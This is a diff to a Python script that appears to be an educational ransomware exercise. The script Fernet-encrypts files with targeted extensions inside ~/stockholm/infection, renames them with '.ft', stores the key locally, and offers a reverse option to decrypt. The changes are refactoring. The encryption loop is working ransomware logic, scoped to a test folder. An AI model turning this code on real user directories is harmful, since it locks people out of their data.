@@ -18,7 +18,7 @@ EXTS = ['.der','.pfx','.crt','csr','p12','.pem','.odt','.ott','.sxw','.uot','.3d
 
 
 HOME = os.getenv("HOME")
-PATH = HOME + "/stockholm/infection" # Creates a new PATH by joining HOME and infection folders path.
+PATH = HOME + "/stockholm/infection"
 KEY_FILE = "encrypt.key"
 
 
@@ -32,41 +32,39 @@ def parse():
 	parser.add_argument("-r", "--reverse", help ="Option -r, --reverse : Reverse the infection, followed by the key entered as an argument.")
 	parser.add_argument("-s", "--silent", action="store_true", help="Option -s, --silent : The program will not produce any output.", default=False)
 	args = parser.parse_args()
-	return args.__dict__
+	return args
 
 
-def main(arg):
+def main(arg, fernet):
     for root, dirs, files in os.walk(PATH):
         for f in files:
-            if not arg.reverse and f[f.rfind("."):] != ".ft" \
-                    and f[f.rfind("."):] in EXTS:
+            if not arg.reverse and f[f.rfind("."):] != ".ft" and f[f.rfind("."):] in EXTS:
                 if not arg.silent:
                     print(root + "/" + f)
-                do_crypto(root + "/" + f)
+                ft_encrypt_decrypt(root + "/" + f, True, fernet)
                 os.rename(root + "/" + f, root + "/" + f + ".ft")
             if arg.reverse and f[f.rfind("."):] == ".ft":
                 if not arg.silent:
                     print(root + "/" + f)
-                do_crypto(root + "/" + f, encrypt=False)
+                ft_encrypt_decrypt(root + "/" + f, False, fernet)
                 os.rename(root + "/" + f, root + "/" + f[:f.rfind(".")])
 
 
-def do_crypto(file_path, encrypt=True):
+def ft_encrypt_decrypt(file_path, encrypt, fernet):
     with open(file_path, "rb") as f:
-        original = f.read()
-
+        a_file = f.read()
     try:
         if encrypt:
-            modified = fernet.encrypt(original)
+            en_de = fernet.encrypt(a_file)
         else:
-            modified = fernet.decrypt(original)
+            en_de = fernet.decrypt(a_file)
 
     except:
         print("Decrypt proccess not posible.")
         return
 
     with open(file_path, "wb") as f:
-        f.write(modified)
+        f.write(en_de)
 
 
 if __name__ == "__main__":
@@ -82,18 +80,17 @@ if __name__ == "__main__":
             print("... there is not directory: ", PATH)
 
     # Crea la clave de encriptado si no existe
-    if not os.path.exists(KEY_FILE) and arg.reverse == None:
+    if not os.path.exists(KEY_FILE) and not arg.reverse:
         key = Fernet.generate_key() # Generate new .key.
         with open(KEY_FILE, "wb") as f:
             f.write(key)
 
     #Lee y almacena la clave
-    if arg.reverse == None:
+    if not	arg.reverse:
         with open(KEY_FILE, "rb") as f:
             key = f.read()
         fernet = Fernet(key)
     else:
         fernet = Fernet(arg.reverse)
 
-
-    main(arg)
+    main(arg, fernet)
